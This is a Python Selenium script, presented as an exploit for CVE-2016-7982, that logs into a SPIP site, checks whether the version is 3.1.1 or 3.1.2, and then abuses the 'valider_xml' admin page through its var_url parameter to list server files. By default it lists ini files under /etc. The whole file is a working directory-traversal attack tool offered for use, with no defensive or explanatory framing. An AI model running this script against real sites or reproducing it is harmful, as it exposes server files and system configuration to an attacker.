from huepy import *
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.webdriver import WebDriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.firefox.webelement import FirefoxWebElement as WebElement
import selenium.webdriver.support.expected_conditions as EC
from argparse import ArgumentParser, RawTextHelpFormatter
from typing import List

parser = ArgumentParser(description="Exploit for CVE-2016-7982",
                        formatter_class=RawTextHelpFormatter)
parser.add_argument("--target",
                    "-t",
                    help="vulnerable website link with protocol",
                    required=True,
                    dest="t")
parser.add_argument("--username",
                    "-u",
                    help="username",
                    required=True,
                    dest="u")
parser.add_argument("--password",
                    "-p",
                    help="password",
                    required=True,
                    dest="p")
parser.add_argument("--dir",
                    "-D",
                    help="directory to traverse (default: /etc)",
                    dest="dir",
                    default="/etc")
parser.add_argument("--ext",
                    "-e",
                    help="extension to filter (default: ini)",
                    default="ini",
                    dest="ext")
parser.add_argument("--debug",
                    help="if passed, spawns firefox window",
                    action="store_false",
                    default=True)
args = parser.parse_args()
if args.t.endswith("/"):
    args.t = args.t[:-1]

opt = Options()
opt.headless = args.debug
driver = WebDriver(options=opt)
driver.maximize_window()
print(info("Logging in"))
driver.get(args.t + '/spip.php?page=login&url=.%2F')
driver.find_element_by_xpath("//input[@id='var_login']").send_keys(args.u)
driver.find_element_by_xpath("//input[@id='password']").send_keys(args.p)
driver.find_element_by_xpath(
    "//body/div[@id='minipres']/div[1]/form[1]/p[1]/input[1]").click()
try:
    err: WebElement = WebDriverWait(driver, 2).until(
        EC.presence_of_element_located((
            By.XPATH,
            "//p[contains(text(),'Your entry contains an error, please check your in')]"
        )))
    print(bad(err.text.strip()))
    exit(1)
except TimeoutException:
    print(good("Logged in successfully"))
    pass
driver.get(args.t + "/ecrire/")
version: WebElement = driver.find_element_by_xpath(
    "//body/div[@id='page']/div[@id='pied']/div[1]/div[1]/b[1]")
version = version.text.split("[")[0].split("SPIP ")[1].strip()
major, minor, patch = [*map(int, version.split('.'))]

if major == 3 and minor == 1 and (patch == 2 or patch == 1):
    print(good("Version is vulnerable to directory traversal"))
else:
    print(bad("Version not vulnerable"))
    driver.quit()
    exit(1)

if version == "3.1.2":
    args.dir = "file://" + args.dir

print(
    info("Traversing directory '%s' with '%s' extension" %
         (args.dir, args.ext)))

driver.get(args.t + '/ecrire/?exec=valider_xml&var_url=%s&ext=%s&recur=2' %
           (args.dir, args.ext))
table: WebElement = driver.find_element_by_xpath(
    "//body/div[@id='page']/div[1]/table[1]")

cols: List[WebElement] = table.find_elements_by_tag_name("td")
cols: List[WebElement] = filter(lambda x: x.text.strip().startswith(args.dir),
                                cols)

for col in cols:
    print(col.text)